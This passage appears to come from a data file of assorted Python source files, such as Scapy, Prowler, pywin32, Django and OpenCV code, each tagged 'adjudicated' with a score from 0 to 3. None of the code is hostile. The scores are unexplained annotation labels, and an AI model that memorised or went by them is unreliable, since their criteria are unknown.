""""""\<<NEWL>>    The ``gunicorn`` command line runner for launching Gunicorn with<<NEWL>>    generic WSGI applications.<<NEWL>>    """"""<<NEWL>>    from gunicorn.app.wsgiapp import WSGIApplication<<NEWL>>    WSGIApplication(""%(prog)s [OPTIONS] [APP_MODULE]"").run()<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    run()"
458	adjudicated	2	"# This file is part of Scapy<<NEWL>># See http://www.secdev.org/projects/scapy for more information<<NEWL>># Copyright (C) Philippe Biondi <phil@secdev.org><<NEWL>># This program is published under a GPLv2 license<<NEWL>><<NEWL>>""""""<<NEWL>>External link to programs<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>import subprocess<<NEWL>>from scapy.error import log_loading<<NEWL>><<NEWL>># Notice: this file must not be called before main.py, if started<<NEWL>># in interactive mode, because it needs to be called after the<<NEWL>># logger has been setup, to be able to print the warning messages<<NEWL>><<NEWL>># MATPLOTLIB<<NEWL>><<NEWL>>try:<<NEWL>>    from matplotlib import get_backend as matplotlib_get_backend<<NEWL>>    from matplotlib import pyplot as plt<<NEWL>>    from matplotlib.lines import Line2D<<NEWL>>    MATPLOTLIB = 1<<NEWL>>    if ""inline"" in matplotlib_get_backend():<<NEWL>>        MATPLOTLIB_INLINED = 1<<NEWL>>    else:<<NEWL>>        MATPLOTLIB_INLINED = 0<<NEWL>>    MATPLOTLIB_DEFAULT_PLOT_KARGS = {""marker"": ""+""}<<NEWL>># RuntimeError to catch gtk ""Cannot open display"" error<<NEWL>>except (ImportError, RuntimeError):<<NEWL>>    plt = None<<NEWL>>    Line2D = None<<NEWL>>    MATPLOTLIB = 0<<NEWL>>    MATPLOTLIB_INLINED = 0<<NEWL>>    MATPLOTLIB_DEFAULT_PLOT_KARGS = dict()<<NEWL>>    log_loading.info(""Can't import matplotlib. Won't be able to plot."")<<NEWL>><<NEWL>># PYX<<NEWL>><<NEWL>><<NEWL>>def _test_pyx():<<NEWL>>    # type: () -> bool<<NEWL>>    """"""Returns if PyX is correctly installed or not""""""<<NEWL>>    try:<<NEWL>>        with open(os.devnull, 'wb') as devnull:<<NEWL>>            r = subprocess.check_call([""pdflatex"", ""--version""],<<NEWL>>                                      stdout=devnull, stderr=subprocess.STDOUT)<<NEWL>>    except (subprocess.CalledProcessError, OSError):<<NEWL>>        return False<<NEWL>>    else:<<NEWL>>        return r == 0<<NEWL>><<NEWL>><<NEWL>>try:<<NEWL>>    import pyx  # noqa: F401<<NEWL>>    if _test_pyx():<<NEWL>>        PYX = 1<<NEWL>>    else:<<NEWL>>        log_loading.info(""PyX dependencies are not installed ! Please install TexLive or MikTeX."")  # noqa: E501<<NEWL>>        PYX = 0<<NEWL>>except ImportError:<<NEWL>>    log_loading.info(""Can't import PyX. Won't be able to use psdump() or pdfdump()."")  # noqa: E501<<NEWL>>    PYX = 0"
409	adjudicated	2	"import os<<NEWL>>import json<<NEWL>><<NEWL>>import torch<<NEWL>>from PIL import Image<<NEWL>>from torchvision import transforms<<NEWL>>import matplotlib.pyplot as plt<<NEWL>><<NEWL>>from vit_model import vit_base_patch16_224_in21k as create_model<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")<<NEWL>><<NEWL>>    data_transform = transforms.Compose(<<NEWL>>        [transforms.Resize(256),<<NEWL>>         transforms.CenterCrop(224),<<NEWL>>         transforms.ToTensor(),<<NEWL>>         transforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])])<<NEWL>><<NEWL>>    # load image<<NEWL>>    img_path = ""../tulip.jpg""<<NEWL>>    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)<<NEWL>>    img = Image.open(img_path)<<NEWL>>    plt.imshow(img)<<NEWL>>    # [N, C, H, W]<<NEWL>>    img = data_transform(img)<<NEWL>>    # expand batch dimension<<NEWL>>    img = torch.unsqueeze(img, dim=0)<<NEWL>><<NEWL>>    # read class_indict<<NEWL>>    json_path = './class_indices.json'<<NEWL>>    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)<<NEWL>><<NEWL>>    with open(json_path, ""r"") as f:<<NEWL>>        class_indict = json.load(f)<<NEWL>><<NEWL>>    # create model<<NEWL>>    model = create_model(num_classes=5, has_logits=False).to(device)<<NEWL>>    # load model weights<<NEWL>>    model_weight_path = ""./weights/model-9.pth""<<NEWL>>    model.load_state_dict(torch.load(model_weight_path, map_location=device))<<NEWL>>    model.eval()<<NEWL>>    with torch.no_grad():<<NEWL>>        # predict class<<NEWL>>        output = torch.squeeze(model(img.to(device))).cpu()<<NEWL>>        predict = torch.softmax(output, dim=0)<<NEWL>>        predict_cla = torch.argmax(predict).numpy()<<NEWL>><<NEWL>>    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],<<NEWL>>                                                 predict[predict_cla].numpy())<<NEWL>>    plt.title(print_res)<<NEWL>>    for i in range(len(predict)):<<NEWL>>        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],<<NEWL>>                                                  predict[i].numpy()))<<NEWL>>    plt.show()<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    main()"
347	adjudicated	0	"from functools import partial<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from ..argument import Argument, to_arguments<<NEWL>>from ..field import Field<<NEWL>>from ..inputfield import InputField<<NEWL>>from ..scalars import String<<NEWL>>from ..structures import NonNull<<NEWL>><<NEWL>><<NEWL>>def test_argument():<<NEWL>>    arg = Argument(String, default_value=""a"", description=""desc"", name=""b"")<<NEWL>>    assert arg.type == String<<NEWL>>    assert arg.default_value == ""a""<<NEWL>>    assert arg.description == ""desc""<<NEWL>>    assert arg.name == ""b""<<NEWL>><<NEWL>><<NEWL>>def test_argument_comparasion():<<NEWL>>    arg1 = Argument(String, name=""Hey"", description=""Desc"", default_value=""default"")<<NEWL>>    arg2 = Argument(String, name=""Hey"", description=""Desc"", default_value=""default"")<<NEWL>><<NEWL>>    assert arg1 == arg2<<NEWL>>    assert arg1 != String()<<NEWL>><<NEWL>><<NEWL>>def test_argument_required():<<NEWL>>    arg = Argument(String, required=True)<<NEWL>>    assert arg.type == NonNull(String)<<NEWL>><<NEWL>><<NEWL>>def test_to_arguments():<<NEWL>>    args = {""arg_string"": Argument(String), ""unmounted_arg"": String(required=True)}<<NEWL>><<NEWL>>    my_args = to_arguments(args)<<NEWL>>    assert my_args == {<<NEWL>>        ""arg_string"": Argument(String),<<NEWL>>        ""unmounted_arg"": Argument(String, required=True),<<NEWL>>    }<<NEWL>><<NEWL>><<NEWL>>def test_to_arguments_raises_if_field():<<NEWL>>    args = {""arg_string"": Field(String)}<<NEWL>><<NEWL>>    with pytest.raises(ValueError) as exc_info:<<NEWL>>        to_arguments(args)<<NEWL>><<NEWL>>    assert str(exc_info.value) == (<<NEWL>>        ""Expected arg_string to be Argument, but received Field. Try using ""<<NEWL>>        ""Argument(String).""<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_to_arguments_raises_if_inputfield():<<NEWL>>    args = {""arg_string"": InputField(String)}<<NEWL>><<NEWL>>    with pytest.raises(ValueError) as exc_info:<<NEWL>>        to_arguments(args)<<NEWL>><<NEWL>>    assert str(exc_info.value) == (<<NEWL>>        ""Expected arg_string to be Argument, but received InputField. Try ""<<NEWL>>        ""using Argument(String).""<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_argument_with_lazy_type():<<NEWL>>    MyType = object()<<NEWL>>    arg = Argument(lambda: MyType)<<NEWL>>    assert arg.type == MyType<<NEWL>><<NEWL>><<NEWL>>def test_argument_with_lazy_partial_type():<<NEWL>>    MyType = object()<<NEWL>>    arg = Argument(partial(lambda: MyType))<<NEWL>>    assert arg.type == MyType"
207	adjudicated	3	"###############################################################################<<NEWL>>#<<NEWL>># The MIT License (MIT)<<NEWL>>#<<NEWL>># Copyright (c) typedef int GmbH<<NEWL>>#<<NEWL>># Permission is hereby granted, free of charge, to any person obtaining a copy<<NEWL>># of this software and associated documentation files (the ""Software""), to deal<<NEWL>># in the Software without restriction, including without limitation the rights<<NEWL>># to use, copy, modify, merge, publish, distribute, sublicense, and/or sell<<NEWL>># copies of the Software, and to permit persons to whom the Software is<<NEWL>># furnished to do so, subject to the following conditions:<<NEWL>>#<<NEWL>># The above copyright notice and this permission notice shall be included in<<NEWL>># all copies or substantial portions of the Software.<<NEWL>>#<<NEWL>># THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR<<NEWL>># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,<<NEWL>># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE<<NEWL>># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER<<NEWL>># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,<<NEWL>># OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN<<NEWL>># THE SOFTWARE.<<NEWL>>#<<NEWL>>###############################################################################<<NEWL>><<NEWL>>import platform<<NEWL>><<NEWL>>import autobahn<<NEWL>><<NEWL>># WebSocket protocol support<<NEWL>>from autobahn.asyncio.websocket import \<<NEWL>>    WebSocketServerProtocol, \<<NEWL>>    WebSocketClientProtocol, \<<NEWL>>    WebSocketServerFactory, \<<NEWL>>    WebSocketClientFactory<<NEWL>><<NEWL>># WAMP support<<NEWL>>from autobahn.asyncio.wamp import ApplicationSession<<NEWL>><<NEWL>><<NEWL>>__all__ = (<<NEWL>>    'WebSocketServerProtocol',<<NEWL>>    'WebSocketClientProtocol',<<NEWL>>    'WebSocketServerFactory',<<NEWL>>    'WebSocketClientFactory',<<NEWL>>    'ApplicationSession',<<NEWL>>)<<NEWL>><<NEWL>>__ident__ = 'Autobahn/{}-asyncio-{}/{}'.format(autobahn.__version__, platform.python_implementation(), platform.python_version())<<NEWL>>""""""<<NEWL>>AutobahnPython library implementation (eg. ""Autobahn/0.13.0-asyncio-CPython/3.5.1"")<<NEWL>>"""""""
196	adjudicated	3	"""""""<<NEWL>>    pygments.styles.perldoc<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Style similar to the style used in the `perldoc`_ code blocks.<<NEWL>><<NEWL>>    .. _perldoc: http://perldoc.perl.org/<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace<<NEWL>><<NEWL>><<NEWL>>class PerldocStyle(Style):<<NEWL>>    """"""<<NEWL>>    Style similar to the style used in the perldoc code blocks.<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = '#eeeedd'<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Whitespace:             '#bbbbbb',<<NEWL>>        Comment:                '#228B22',<<NEWL>>        Comment.Preproc:        '#1e889b',<<NEWL>>        Comment.Special:        '#8B008B bold',<<NEWL>><<NEWL>>        String:                 '#CD5555',<<NEWL>>        String.Heredoc:         '#1c7e71 italic',<<NEWL>>        String.Regex:           '#B452CD',<<NEWL>>        String.Other:           '#cb6c20',<<NEWL>>        String.Regex:           '#1c7e71',<<NEWL>><<NEWL>>        Number:                 '#B452CD',<<NEWL>><<NEWL>>        Operator.Word:          '#8B008B',<<NEWL>><<NEWL>>        Keyword:                '#8B008B bold',<<NEWL>>        Keyword.Type:           '#00688B',<<NEWL>><<NEWL>>        Name.Class:             '#008b45 bold',<<NEWL>>        Name.Exception:         '#008b45 bold',<<NEWL>>        Name.Function:          '#008b45',<<NEWL>>        Name.Namespace:         '#008b45 underline',<<NEWL>>        Name.Variable:          '#00688B',<<NEWL>>        Name.Constant:          '#00688B',<<NEWL>>        Name.Decorator:         '#707a7c',<<NEWL>>        Name.Tag:               '#8B008B bold',<<NEWL>>        Name.Attribute:         '#658b00',<<NEWL>>        Name.Builtin:           '#658b00',<<NEWL>><<NEWL>>        Generic.Heading:        'bold #000080',<<NEWL>>        Generic.Subheading:     'bold #800080',<<NEWL>>        Generic.Deleted:        '#aa0000',<<NEWL>>        Generic.Inserted:       '#00aa00',<<NEWL>>        Generic.Error:          '#aa0000',<<NEWL>>        Generic.Emph:           'italic',<<NEWL>>        Generic.Strong:         'bold',<<NEWL>>        Generic.Prompt:         '#555555',<<NEWL>>        Generic.Output:         '#888888',<<NEWL>>        Generic.Traceback:      '#aa0000',<<NEWL>><<NEWL>>        Error:                  'bg:#e3d2d2 #a61717'<<NEWL>>    }"
316	adjudicated	3	import numpy as np<<NEWL>>import numba<<NEWL>><<NEWL>># - plotStratigraphy takes 1) XorY_StratiOverTime (time and either x or y dimensions): strati__elevation selected for only the basin area and either averaged or selected for one across (y)/down(x) basin distance <<NEWL>>#     2) XorY_GrainSizeOverTime (time and either x or y dimensions) the grain size or erosion rate or other desired variable that will be used to fill the stratigraphy. This also needs to be selected or averaged for one x/y distance. <<NEWL>># - stratigraphy as it is written assumes that channels are draining either in the x or y direction (mountain along one axis) and stratigraphy is generated along one axis.     <<NEWL>># - plotStratigraphy averages the nearby nodes (grain size or erosion rate or other desired value passed) to fill a given cell of stratigraphy.<<NEWL>># -plotStraigraphy2 does not average the nearest nodes and takes the first closest value to fill the stratigraphy. <<NEWL>><<NEWL>>@numba.njit<<NEWL>>def plotStratigraphy(XorY_StratiOverTime,XorY_GrainSizeOverTime):<<NEWL>>    i=0<<NEWL>>    j=0<<NEWL>>    C=np.zeros(((XorY_StratiOverTime.shape[0]),(XorY_StratiOverTime.shape[1])))<<NEWL>>    for i in range(0,(XorY_StratiOverTime.shape[1])):<<NEWL>>        for j in range(0,(XorY_StratiOverTime.shape[0])):<<NEWL>>            tryff=np.array([XorY_GrainSizeOverTime[j,i],XorY_GrainSizeOverTime[j,i+1],XorY_GrainSizeOverTime[j+1,i],XorY_GrainSizeOverTime[j+1,i+1]])<<NEWL>>            C[j,i]=np.nanmean(tryff)<<NEWL>>    return C<<NEWL>><<NEWL>>@numba.njit<<NEWL>>def plotStratigraphy2(XorY_StratiOverTime,XorY_GrainSizeOverTime):<<NEWL>>    i=0<<NEWL>>    j=0<<NEWL>>    C=np.zeros(((XorY_StratiOverTime.shape[0]),(XorY_StratiOverTime.shape[1])))<<NEWL>>    for i in range(0,(XorY_StratiOverTime.shape[1])):<<NEWL>>        for j in range(0,(XorY_StratiOverTime.shape[0])):<<NEWL>>            #tryff=np.array([XorY_GrainSizeOverTime[j,i],XorY_GrainSizeOverTime[j,i+1],XorY_GrainSizeOverTime[j+1,i],XorY_GrainSizeOverTime[j+1,i+1]])<<NEWL>>            C[j,i]=(XorY_GrainSizeOverTime[j,i])<<NEWL>>    return C
87	adjudicated	0	"import threading<<NEWL>><<NEWL>>from pydantic import BaseModel<<NEWL>><<NEWL>>from prowler.lib.logger import logger<<NEWL>>from prowler.providers.aws.aws_provider import generate_regional_clients<<NEWL>><<NEWL>><<NEWL>>################## SecretsManager<<NEWL>>class SecretsManager:<<NEWL>>    def __init__(self, audit_info):<<NEWL>>        self.service = ""secretsmanager""<<NEWL>>        self.session = audit_info.audit_session<<NEWL>>        self.audited_account = audit_info.audited_account<<NEWL>>        self.regional_clients = generate_regional_clients(self.service, audit_info)<<NEWL>>        self.secrets = {}<<NEWL>>        self.__threading_call__(self.__list_secrets__)<<NEWL>><<NEWL>>    def __get_session__(self):<<NEWL>>        return self.session<<NEWL>><<NEWL>>    def __threading_call__(self, call):<<NEWL>>        threads = []<<NEWL>>        for regional_client in self.regional_clients.values():<<NEWL>>            threads.append(threading.Thread(target=call, args=(regional_client,)))<<NEWL>>        for t in threads:<<NEWL>>            t.start()<<NEWL>>        for t in threads:<<NEWL>>            t.join()<<NEWL>><<NEWL>>    def __list_secrets__(self, regional_client):<<NEWL>>        logger.info(""SecretsManager - Listing Secrets..."")<<NEWL>>        try:<<NEWL>>            list_secrets_paginator = regional_client.get_paginator(""list_secrets"")<<NEWL>>            for page in list_secrets_paginator.paginate():<<NEWL>>                for secret in page[""SecretList""]:<<NEWL>>                    self.secrets[secret[""Name""]] = Secret(<<NEWL>>                        arn=secret[""ARN""],<<NEWL>>                        name=secret[""Name""],<<NEWL>>                        region=regional_client.region,<<NEWL>>                    )<<NEWL>>                    if ""RotationEnabled"" in secret:<<NEWL>>                        self.secrets[secret[""Name""]].rotation_enabled = secret[<<NEWL>>                            ""RotationEnabled""<<NEWL>>                        ]<<NEWL>><<NEWL>>        except Exception as error:<<NEWL>>            logger.error(<<NEWL>>                f""{regional_client.region} --""<<NEWL>>                f"" {error.__class__.__name__}[{error.__traceback__.tb_lineno}]:""<<NEWL>>                f"" {error}""<<NEWL>>            )<<NEWL>><<NEWL>><<NEWL>>class Secret(BaseModel):<<NEWL>>    arn: str<<NEWL>>    name: str<<NEWL>>    region: str<<NEWL>>    rotation_enabled: bool = False"
256	adjudicated	1	"import win32api, win32security<<NEWL>>import win32con, ntsecuritycon, winnt<<NEWL>>import os<<NEWL>><<NEWL>>temp_dir = win32api.GetTempPath()<<NEWL>>fname = win32api.GetTempFileName(temp_dir, ""rsk"")[0]<<NEWL>>print(fname)<<NEWL>>## file can't exist<<NEWL>>os.remove(fname)<<NEWL>><<NEWL>>## enable backup and restore privs<<NEWL>>required_privs = (<<NEWL>>    (<<NEWL>>        win32security.LookupPrivilegeValue("""", ntsecuritycon.SE_BACKUP_NAME),<<NEWL>>        win32con.SE_PRIVILEGE_ENABLED,<<NEWL>>    ),<<NEWL>>    (<<NEWL>>        win32security.LookupPrivilegeValue("""", ntsecuritycon.SE_RESTORE_NAME),<<NEWL>>        win32con.SE_PRIVILEGE_ENABLED,<<NEWL>>    ),<<NEWL>>)<<NEWL>>ph = win32api.GetCurrentProcess()<<NEWL>>th = win32security.OpenProcessToken(<<NEWL>>    ph, win32con.TOKEN_READ | win32con.TOKEN_ADJUST_PRIVILEGES<<NEWL>>)<<NEWL>>adjusted_privs = win32security.AdjustTokenPrivileges(th, 0, required_privs)<<NEWL>><<NEWL>>try:<<NEWL>>    sa = win32security.SECURITY_ATTRIBUTES()<<NEWL>>    my_sid = win32security.GetTokenInformation(th, ntsecuritycon.TokenUser)[0]<<NEWL>>    sa.SECURITY_DESCRIPTOR.SetSecurityDescriptorOwner(my_sid, 0)<<NEWL>><<NEWL>>    k, disp = win32api.RegCreateKeyEx(<<NEWL>>        win32con.HKEY_CURRENT_USER,<<NEWL>>        ""Python test key"",<<NEWL>>        SecurityAttributes=sa,<<NEWL>>        samDesired=win32con.KEY_ALL_ACCESS,<<NEWL>>        Class=""some class"",<<NEWL>>        Options=0,<<NEWL>>    )<<NEWL>>    win32api.RegSetValue(k, None, win32con.REG_SZ, ""Default value for python test key"")<<NEWL>><<NEWL>>    subk, disp = win32api.RegCreateKeyEx(<<NEWL>>        k,<<NEWL>>        ""python test subkey"",<<NEWL>>        SecurityAttributes=sa,<<NEWL>>        samDesired=win32con.KEY_ALL_ACCESS,<<NEWL>>        Class=""some other class"",<<NEWL>>        Options=0,<<NEWL>>    )<<NEWL>>    win32api.RegSetValue(subk, None, win32con.REG_SZ, ""Default value for subkey"")<<NEWL>><<NEWL>>    win32api.RegSaveKeyEx(<<NEWL>>        k, fname, Flags=winnt.REG_STANDARD_FORMAT, SecurityAttributes=sa<<NEWL>>    )<<NEWL>><<NEWL>>    restored_key, disp = win32api.RegCreateKeyEx(<<NEWL>>        win32con.HKEY_CURRENT_USER,<<NEWL>>        ""Python test key(restored)"",<<NEWL>>        SecurityAttributes=sa,<<NEWL>>        samDesired=win32con.KEY_ALL_ACCESS,<<NEWL>>        Class=""restored class"",<<NEWL>>        Options=0,<<NEWL>>    )<<NEWL>>    win32api.RegRestoreKey(restored_key, fname)<<NEWL>>finally:<<NEWL>>    win32security.AdjustTokenPrivileges(th, 0, adjusted_privs)"
74	adjudicated	1	"import sys<<NEWL>>import time<<NEWL>><<NEWL>>import log4p<<NEWL>>import pcloud<<NEWL>><<NEWL>>log = log4p.GetLogger(__name__, config=""log4p.json"").logger<<NEWL>><<NEWL>><<NEWL>>class Uploader:<<NEWL>><<NEWL>>    def __init__(self, username, password):<<NEWL>>        self.pc = pcloud.PyCloud(username, password)<<NEWL>>        self.path = '/'<<NEWL>><<NEWL>>    def is_logged_in(self):<<NEWL>>        return len(self.pc.auth_token) > 1<<NEWL>><<NEWL>>    def set_path(self, path):<<NEWL>>        self.pc.createfolderifnotexists(path=path)<<NEWL>>        self.path = path<<NEWL>><<NEWL>>    def upload(self, file):<<NEWL>>        response = self.pc.uploadfile(files=[file], path=self.path)<<NEWL>>        log.debug(response)<<NEWL>>        if response['result'] == 0:<<NEWL>>            log.info('Uploaded the file  %s file to pcloud %s', file, self.path)<<NEWL>>            time.sleep(1)<<NEWL>>            return<<NEWL>>        log.error(""Was not able to upload to pcloud"")<<NEWL>>        sys.exit(response['result'])<<NEWL>><<NEWL>>    def get_checksum(self, file):<<NEWL>>        response = self.pc.checksumfile(path=self.path+'/'+file)<<NEWL>>        log.debug(response)<<NEWL>>        return response['sha1']<<NEWL>><<NEWL>>    def is_file_present(self, file):<<NEWL>>        response = self.pc.listfolder(path=self.path)<<NEWL>>        log.debug(response)<<NEWL>>        dir_content = response['metadata']['contents']<<NEWL>>        for item in dir_content:<<NEWL>>            if item['name'] == file:<<NEWL>>                log.info(""File %s is present in directory %s"", file, self.path)<<NEWL>>                return True<<NEWL>>        log.info(""File %s not found in directory %s"", file, self.path)<<NEWL>>        return False<<NEWL>><<NEWL>>    def rename_file(self, file, new_name):<<NEWL>>        response = self.pc.renamefile(<<NEWL>>            path=self.path+'/'+file,<<NEWL>>            topath=self.path+'/'+new_name<<NEWL>>        )<<NEWL>>        log.debug(response)<<NEWL>>        if response['result'] == 0:<<NEWL>>            log.info(""File %s renamed to %s"", file, new_name)<<NEWL>>            time.sleep(1)<<NEWL>>            return<<NEWL>>        log.error(""Failed to rename file %s to %s"", file, new_name)<<NEWL>><<NEWL>>    def delete_file(self, file):<<NEWL>>        response = self.pc.deletefile(path=self.path+'/'+file)<<NEWL>>        log.debug(response)<<NEWL>>        if response['result'] == 0:<<NEWL>>            log.info(""File %s deleted"", file)<<NEWL>>            return<<NEWL>>"
134	adjudicated	0	######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is Mozilla Universal charset detector code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 2001<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#   Shy Shalom - original C code<<NEWL>>#   Proofpoint, Inc.<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .big5prober import Big5Prober<<NEWL>>from .charsetgroupprober import CharSetGroupProber<<NEWL>>from .cp949prober import CP949Prober<<NEWL>>from .eucjpprober import EUCJPProber<<NEWL>>from .euckrprober import EUCKRProber<<NEWL>>from .euctwprober import EUCTWProber<<NEWL>>from .gb2312prober import GB2312Prober<<NEWL>>from .johabprober import JOHABProber<<NEWL>>from .sjisprober import SJISProber<<NEWL>>from .utf8prober import UTF8Prober<<NEWL>><<NEWL>><<NEWL>>class MBCSGroupProber(CharSetGroupProber):<<NEWL>>    def __init__(self, lang_filter=None):<<NEWL>>        super().__init__(lang_filter=lang_filter)<<NEWL>>        self.probers = [<<NEWL>>            UTF8Prober(),<<NEWL>>            SJISProber(),<<NEWL>>            EUCJPProber(),<<NEWL>>            GB2312Prober(),<<NEWL>>            EUCKRProber(),<<NEWL>>            CP949Prober(),<<NEWL>>            Big5Prober(),<<NEWL>>            EUCTWProber(),<<NEWL>>            JOHABProber(),<<NEWL>>        ]<<NEWL>>        self.reset()
25	adjudicated	0	"from django import forms<<NEWL>>from .models import Todo,Assign_task<<NEWL>>from django.contrib.auth.forms import UserCreationForm<<NEWL>>from django.contrib.auth.models import User<<NEWL>><<NEWL>><<NEWL>>class TaskForm(forms.ModelForm):<<NEWL>><<TAB>>class Meta:<<NEWL>><<TAB>><<TAB>>model = Todo<<NEWL>><<TAB>><<TAB>>fields = (""task"",""completed"",""created_date"",""deadline"")<<NEWL>><<NEWL>><<NEWL>>class AssignForm(forms.ModelForm):<<NEWL>><<TAB>>class Meta:<<NEWL>><<TAB>><<TAB>>model = Assign_task<<NEWL>><<TAB>><<TAB>>fields = ""__all__""<<NEWL>><<NEWL>>class NewUserForm(UserCreationForm):<<NEWL>><<TAB>>email = forms.EmailField(required=True)<<NEWL>><<NEWL>><<TAB>>class Meta:<<NEWL>><<TAB>><<TAB>>model = User<<NEWL>><<TAB>><<TAB>>fields = (""username"", ""email"", ""password1"", ""password2"")<<NEWL>><<NEWL>><<TAB>>def save(self, commit=True):<<NEWL>><<TAB>><<TAB>>user = super(NewUserForm, self).save(commit=False)<<NEWL>><<TAB>><<TAB>>user.email = self.cleaned_data['email']<<NEWL>><<TAB>><<TAB>>if commit:<<NEWL>><<TAB>><<TAB>><<TAB>>user.save()<<NEWL>><<TAB>><<TAB>>return user<<NEWL>><<NEWL>>'''class AssignTaskForm(forms.Form):<<NEWL>>    def __init__(self):              <<NEWL>>        self.choice_list = [('test', 'test'),]        <<NEWL>>        self.users = User.objects.all()        <<NEWL>>        for self.x in self.users:<<NEWL>>            self.choice_list.append([self.x.get_username(), self.x.get_username()])        <<NEWL>>        self.CHOICES = self.choice_list<<NEWL>>        super (AssignTaskForm, self).__init__()<<NEWL>>        self.fields['User_choice'].widget = forms.Select(choices=self.CHOICES) <<NEWL>>        <<NEWL>>    User_choice = forms.CharField(max_length=100)<<NEWL>>    start_date = forms.DateField(widget=forms.SelectDateWidget())<<NEWL>>    end_date = forms.DateField(widget=forms.SelectDateWidget())<<NEWL>><<TAB>>Task_Name = forms.CharField(widget=forms.Textarea)'''<<NEWL>><<NEWL>><<NEWL>>class AssignTaskForm(forms.Form):<<NEWL>><<TAB>>def __init__(self):<<NEWL>><<TAB>><<TAB>>self.choice_list = [('test','test'),]<<NEWL>><<TAB>><<TAB>>self.users = User.objects.all()<<NEWL>><<TAB>><<TAB>>for self.x in self.users:<<NEWL>><<TAB>><<TAB>><<TAB>>self.choice_list.append([self.x.get_username(), self.x.get_username()])<<NEWL>><<TAB>><<TAB>>self.CHOICES = self.choice_list <<NEWL>><<TAB>><<TAB>>super(AssignTaskForm,self).__init__()<<NEWL>><<TAB>><<TAB>>self.fields['SELECT_USER'].widget = forms.Select(choices=self.CHOICES)<<NEWL>><<NEWL>><<TAB>>Task_Name = forms.CharField(widget = forms.TextInput)<<NEWL>><<TAB>>SELECT_USER = forms.CharField(max_length = 100)<<NEWL>><<TAB>>start_date = forms.DateField(widget=forms.SelectDateWidget())<<NEWL>><<TAB>>end_date = forms.DateField(widget=forms.SelectDateWidget())"
165	adjudicated	1	"#!/usr/bin/python<<NEWL>><<NEWL>>'''<<NEWL>>This example illustrates how to use Hough Transform to find lines<<NEWL>>'''<<NEWL>><<NEWL>># Python 2/3 compatibility<<NEWL>>from __future__ import print_function<<NEWL>><<NEWL>>import cv2 as cv<<NEWL>>import numpy as np<<NEWL>>import sys<<NEWL>>import math<<NEWL>><<NEWL>>from tests_common import NewOpenCVTests<<NEWL>><<NEWL>>def linesDiff(line1, line2):<<NEWL>><<NEWL>>    norm1 = cv.norm(line1 - line2, cv.NORM_L2)<<NEWL>>    line3 = line1[2:4] + line1[0:2]<<NEWL>>    norm2 = cv.norm(line3 - line2, cv.NORM_L2)<<NEWL>><<NEWL>>    return min(norm1, norm2)<<NEWL>><<NEWL>>class houghlines_test(NewOpenCVTests):<<NEWL>><<NEWL>>    def test_houghlines(self):<<NEWL>><<NEWL>>        fn = ""/samples/data/pic1.png""<<NEWL>><<NEWL>>        src = self.get_sample(fn)<<NEWL>>        dst = cv.Canny(src, 50, 200)<<NEWL>><<NEWL>>        lines = cv.HoughLinesP(dst, 1, math.pi/180.0, 40, np.array([]), 50, 10)[:,0,:]<<NEWL>><<NEWL>>        eps = 5<<NEWL>>        testLines = [<<NEWL>>            #rect1<<NEWL>>             [ 232,  25, 43, 25],<<NEWL>>             [ 43, 129, 232, 129],<<NEWL>>             [ 43, 129,  43,  25],<<NEWL>>             [232, 129, 232,  25],<<NEWL>>            #rect2<<NEWL>>             [251,  86, 314, 183],<<NEWL>>             [252,  86, 323,  40],<<NEWL>>             [315, 183, 386, 137],<<NEWL>>             [324,  40, 386, 136],<<NEWL>>            #triangle<<NEWL>>             [245, 205, 377, 205],<<NEWL>>             [244, 206, 305, 278],<<NEWL>>             [306, 279, 